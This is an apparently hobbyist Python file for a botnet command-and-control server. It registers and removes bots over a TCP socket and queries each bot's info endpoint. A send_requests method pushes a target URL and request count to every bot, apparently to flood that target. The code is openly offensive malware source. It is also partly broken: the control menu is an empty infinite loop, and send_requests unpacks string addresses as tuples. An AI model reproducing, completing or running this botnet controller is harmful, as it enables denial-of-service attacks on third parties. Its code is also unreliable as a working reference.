import http.client

from termcolor import cprint
import requests
import socket
import json


class CnC:
    """
    Command & Control center of the botnet.
    """

    def __init__(self, host, port):
        self.address = (host, port)
        self.bots = []
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind(self.address)
        self.socket.listen(10)

    def run(self):
        cprint("Running...", "green")

        while True:
            client, address = self.socket.accept()
            address = address[0]
            data = client.recv(1024).decode("utf-8")
            if data == "n":
                self.bots.append(address)
                print(f"bot {address} added")
            elif data == "c":
                try:
                    self.bots.remove(address)
                    print(f"bot {address} removed")
                except ValueError:
                    print(f"{address} not in bot list")
            else:
                raise RuntimeError("Bot message not recognized")
            client.close()
            print(self.list_clients())
            try:
                response = requests.get(f"http://{address}:8080/info")
                print(response.text)
            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
                cprint(e, 'yellow')

    def send_requests(self, url, n):
        if len(self.bots) == 0:
            raise RuntimeError("No bot connected.")

        for client, _ in self.bots:
            response = requests.post(f"http://{client}:8080", json={'url': url, 'n': n})

    def list_clients(self):
        if self.bots:
            return "Bots connected:\n" + "\n".join([f"- {b}" for b in self.bots])
        return "No bots connected"

    def control_menu(self):
        choice = None

        while choice != 0:
            pass


HOST = '127.0.0.1'
PORT = 60000

if __name__ == '__main__':
    cnc = CnC(HOST, PORT)
    cnc.run()
